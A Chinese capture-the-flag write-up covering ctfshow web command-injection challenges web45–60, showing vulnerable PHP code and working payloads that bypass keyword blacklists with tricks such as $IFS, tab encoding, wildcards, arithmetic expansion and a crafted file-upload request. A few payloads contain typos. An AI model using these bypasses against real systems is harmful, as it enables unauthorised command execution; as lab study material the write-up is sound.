# ctfshow-web命令执行(web45-60)
# ctfshow-web命令执行(web45-60)
[toc]

## web45 &&等于; tab等于space
**题目描述**

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

> 观察代码，多过滤了分号与空格，考虑用&&代替分号（&&代表执行两个命令，让后面的命令进入黑洞），用tab制表符代替空格

---
**payload**解法1->`url/?c=tac%09fla?.php%26%26ls`解法2->`url/?c=echo$IFS`tac$IFS*`%0A`  \$IFS代表shell里面的空格
解法3->`url/?c=tac%09fla?.php%0a`

---




## web46 过滤数字\*\$
**题目描述**

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

> 分析源代码，多过滤了\* \$ 数字，因此上题的payload均可用

---
**payload**

解法1->`url/?c=tac%09fla?.php%26%26ls`解法2->`url/?c=echo$IFS`tac$IFS*`%0A`
解法3->`url/?c=tac%09fla?.php%0a`

---




## web47 <等于空格 ||解决黑洞
**题目描述**

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

> 多过滤了一些字符，没有丝毫影响

---
**payload**

解法一二三上同
解法四->`nl<fla''g.php||` nl查看源代码，<代替空格，''分割flag过滤，||解决命令黑洞

---




## web48 没什么软用
**题目描述**

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

> 多过滤了字符，但丝毫不影响

---
**payload**

上同

---


## web49 仍然没什么软用
**题目描述**

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
---
**题目分析**

过滤了百分号，然而之前的payload中的%在url编码时会被干掉，所以没有任何影响\~

---
**payload**

上同

---






## web50 过滤了%09%26
**题目描述**

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

根据源代码过滤了制表符，那就用<代替空格

但尝试了payload(url/?c=tac<fl?g.php%0a)发现不行，换掉?就可以了，暂时不知道是什么原因

---
**payload**

```php
url/?c=tac<fl''ag.php%0a
```
---






## web51 过滤了tac
**题目描述**

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

根据源代码，多过滤了tac，就只有使用nl大法啦

---
**payload**

```php
url/?c=nl<fla''g.php%0a
```
---




## web52 过滤了>和<
**题目描述**

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

根据源代码，过滤了<和>，那就用\$IFS表示空格

---
**payload**

```php
url/?c=nl$IFS/fla''g%0a
```
---




## web53 添加了回显
**题目描述**

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

根据源代码，多过滤了wget，并添加了回显，但对payload没有影响

---
**payload**

```php
url/?c=nl${IFS}fla?.php
```
---




## web54 丧心病狂不让用''绕过
**题目描述**

```php
 <?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

根据源代码，将使用''的行为剔除了，因此只能另辟蹊径，可以考虑使用cp命令，但尝试过后发现无响应，而使用mv可以实现，查询后猜测应该是用户权限不够

---
**payload**

```php
url/?c=mv${IFS}fla?.php${IFS}abc.txt
url/abc.txt
```
---






## web55 过滤了所有字母
**题目描述**

```php
<?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

[web55题解](https://blog.csdn.net/qq_46091464/article/details/108513145)

[无字母数字webshell提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

从师傅们的文章中可以知道构造 ?c=.+/???/????????\[@-\[\] 可以运行刚刚上传的文件中的命令

---
**payload**

POC构造模板：

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```
打开html页面上传任意文件，修改包里内容，修改后：

```typescript
POST /?c=.%20/???/????????[@-[]  HTTP/1.1

Host: 25e9249e-1055-47f7-b66c-9823981070ad.challenge.ctf.show

Content-Length: 319

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: null

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMBaQ4lf7ZwU6ckXf

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Connection: close

------WebKitFormBoundaryMBaQ4lf7ZwU6ckXf

Content-Disposition: form-data; name="file"; filename="1.php"

Content-Type: application/octet-stream

#!/bin/sh

cat flag.php

------WebKitFormBoundaryMBaQ4lf7ZwU6ckXf

Content-Disposition: form-data; name="submit"

提交

------WebKitFormBoundaryMBaQ4lf7ZwU6ckXf--
```
返回flag

---






## web56 过滤了所有字母2
**题目描述**

```php
 <?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

与上题一致，注意多试几次（因为上传的时候文件名不一定是大写的）（通配符匹配的是大写的临时文件存储的地方）

---
**payload**

```php
上同
```
---




## web57 \$(())
**题目描述**

```php
<?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```
---
**题目分析**

        提示访问36.php,前一个方法还可以使用，但这次用另一个方法，根据源代码知道只需让c为36即可获得flag(会自动拼接)

已知

```bash
┌──(amateur㉿kali)-[~]
└─$ echo $((~$(()))) 
-1                                                   
┌──(amateur㉿kali)-[~]
└─$ echo $((~$(($((~$(())))+$((~$(())))))))            
1                                                     
┌──(amateur㉿kali)-[~]
└─$ echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))
2
```
        由此可知，访问36.php只需要将里面的元素复制到36个，编写python脚本生成，上传得到flag

---
python脚本：

```python
s1 = "$((~$(("
s2 = ""
lils2 = "$((~$(())))"
s3 = "))))"

for i in range(37):
    s2 += lils2

print(s1+s2+s3)
```
输出：\$((\~\$((\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))\$((\~\$(())))))))

验证：

```bash
┌──(amateur㉿kali)-[~]
└─$ echo $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
36
```
payload:

```html
url/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```
---






## web58 无回显
**题目描述**

```php
<?php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

      回显的代码未告诉禁用了哪些东西，只能一个一个尝试

---
**payload**

```php
解法一：url/?c=file_get_contents('flag.php');
解法二：url/?c=show_cource('flag.php');
```
---




## web59 无回显2
**题目描述**

```php
<?php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

        尝试后发现禁用了show*source（）的方式，但未禁用file\_get\_contents()*

---
**payload**

```php
url/?c=file_get_contents('flag.php');
```
---




## web60 无回显3
**题目描述**

```php
<?php
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```
---
**题目分析**

      禁用了file\_*get\_contents()，但没禁用show\_source()*

---
**payload**

```php
url/?c=show_cource('flag.php');
```
---
